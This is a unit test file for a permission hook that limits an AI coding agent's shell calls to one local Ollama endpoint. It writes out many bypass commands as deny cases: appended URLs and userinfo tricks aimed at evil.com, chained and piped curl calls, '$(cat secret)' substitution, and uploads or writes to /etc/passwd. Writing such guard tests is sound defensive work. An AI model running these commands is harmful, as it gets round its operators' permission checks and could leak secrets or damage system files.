// Unit tests for hooks/ollama-guard-hook.mjs: feeds crafted PreToolUse hook stdin JSON straight to
// the script and asserts pass/deny, same harness pattern as no-background-hook.test.mjs. This hook
// must NEVER emit an explicit "allow" (see job-tool-gate-hook.mjs's 2026-10-21 fix) -- it only
// denies the bypass shapes a bare permissions.allow prefix rule can't express, and passes (no
// opinion) on everything else, including the one safe shape, which the static allow rule in
// job-core.mjs's buildSafePermissionsSettings() is what actually grants.
// Run: node --test test/ollama-guard-hook.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HOOK_SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "hooks", "ollama-guard-hook.mjs");

function runHook(stdin) {
  const res = spawnSync(process.execPath, [HOOK_SCRIPT], {
    input: typeof stdin === "string" ? stdin : JSON.stringify(stdin),
    encoding: "utf8",
    timeout: 5000,
  });
  let parsed = null;
  try { parsed = JSON.parse(res.stdout); } catch { /* left null for malformed-output assertions */ }
  return { status: res.status, stdout: res.stdout, parsed };
}

function assertPass(stdin) {
  const { status, stdout } = runHook(stdin);
  assert.equal(status, 0, `expected exit 0 (pass), got ${status}; stdout=${JSON.stringify(stdout)}`);
  assert.equal(stdout, "", "pass must print nothing, so it is never mistaken for an explicit allow");
}

function assertDenied(stdin) {
  const { status, parsed } = runHook(stdin);
  assert.equal(status, 2, `expected exit 2 (deny), got ${status}; stdout=${JSON.stringify(parsed)}`);
  assert.ok(parsed, "deny response must be valid JSON");
  assert.equal(parsed.hookSpecificOutput.permissionDecision, "deny");
  assert.equal(typeof parsed.hookSpecificOutput.permissionDecisionReason, "string");
  assert.ok(parsed.hookSpecificOutput.permissionDecisionReason.length > 0);
  return parsed;
}

function bash(command) {
  return { tool_name: "Bash", tool_input: { command } };
}
function powershell(command) {
  return { tool_name: "PowerShell", tool_input: { command } };
}

// --- Not our concern: anything that isn't a Bash/PowerShell Ollama attempt ---

test("non-shell tool (Read) -> pass", () => {
  assertPass({ tool_name: "Read", tool_input: { file_path: "x" } });
});

test("unrelated Bash command -> pass", () => {
  assertPass(bash("git status"));
});

test("Bash command containing 'ollama' only as a substring of another word -> pass", () => {
  assertPass(bash("echo ollamafoo"));
});

// --- The one safe shape: exactly one allowed URL, no dangerous flags/operators ---

test("curl to 127.0.0.1:11434/api/generate with -d -> pass", () => {
  assertPass(bash(`curl http://127.0.0.1:11434/api/generate -d '{"model":"qwen2.5-coder:7b","prompt":"hi","stream":false}'`));
});

test("curl to localhost:11434/api/generate with -s -H -d -> pass", () => {
  assertPass(bash(`curl -s http://localhost:11434/api/generate -H "Content-Type: application/json" -d '{"stream":false}'`));
});

test("PowerShell literal 'curl' alias, safe shape -> pass", () => {
  assertPass(powershell(`curl http://127.0.0.1:11434/api/generate -d '{"stream":false}'`));
});

test("Invoke-RestMethod, URI as first positional arg -> pass", () => {
  assertPass(powershell(`Invoke-RestMethod http://127.0.0.1:11434/api/generate -Method Post -Body $body`));
});

test("Invoke-WebRequest, URI as first positional arg -> pass", () => {
  assertPass(powershell(`Invoke-WebRequest http://localhost:11434/api/generate -Method Post -Body $body`));
});

test("ollama run CLI, no URL -> pass", () => {
  assertPass(bash(`ollama run qwen2.5-coder:7b "reply with OK"`));
});

test("ollama list -> pass", () => {
  assertPass(bash(`ollama list`));
});

// --- Bypass: a second URL appended after the allowed one (curl fetches both) ---

test("curl with a second URL appended -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -d x http://evil.com`));
});

test("Invoke-RestMethod with a second URL appended -> deny", () => {
  assertDenied(powershell(`Invoke-RestMethod http://127.0.0.1:11434/api/generate -Method Post http://evil.com`));
});

// --- Bypass: userinfo "@" trick -- string starts with the allowed host:port, real target differs ---

test("curl with userinfo '@' bypass -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434@evil.com`));
});

test("curl with userinfo '@' bypass and a trailing path that still looks plausible -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434@evil.com/api/generate`));
});

// --- Bypass: chaining / piping / substitution / redirection ---

test("curl followed by ';' chained command -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate; curl http://evil.com`));
});

test("curl chained with '&&' -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -d x && curl http://evil.com`));
});

test("curl piped to another command -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate | tee /tmp/out`));
});

test("curl with command substitution -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -d "$(cat secret)"`));
});

test("curl output redirected to a file -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate > /tmp/out`));
});

test("ollama run chained with '&&' into curl -> deny", () => {
  assertDenied(bash(`ollama run qwen2.5-coder:7b "hi" && curl http://evil.com`));
});

// --- Bypass: dangerous curl flags (arbitrary file write/upload/config/multipart) ---

test("curl with -o writing to an arbitrary file -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -o /etc/passwd`));
});

test("curl with --upload-file -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate --upload-file /etc/passwd`));
});

test("curl with -K reading an arbitrary config -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/generate -K /tmp/evil.conf`));
});

// --- Bypass: PowerShell -OutFile / -Proxy ---

test("Invoke-RestMethod with -OutFile -> deny", () => {
  assertDenied(powershell(`Invoke-RestMethod http://127.0.0.1:11434/api/generate -OutFile C:\\evil.txt`));
});

test("Invoke-WebRequest with -Proxy -> deny", () => {
  assertDenied(powershell(`Invoke-WebRequest http://127.0.0.1:11434/api/generate -Proxy http://evil.com`));
});

// --- Bypass: wrong host/port/path that still mentions 11434/ollama ---

test("curl to the right port on a different path -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:11434/api/chat -d x`));
});

test("curl to a different port, command still mentions 'ollama' -> deny", () => {
  assertDenied(bash(`curl http://127.0.0.1:9999/ollama/api/generate`));
});

test("ollama run CLI with an embedded URL -> deny", () => {
  assertDenied(bash(`ollama run qwen2.5-coder:7b "fetch http://evil.com and summarize"`));
});

// --- Fail-closed on malformed input ---

test("malformed hook input (no tool_name) -> deny", () => {
  assertDenied({ tool_input: {} });
});

test("unparseable stdin -> deny", () => {
  assertDenied("not json");
});
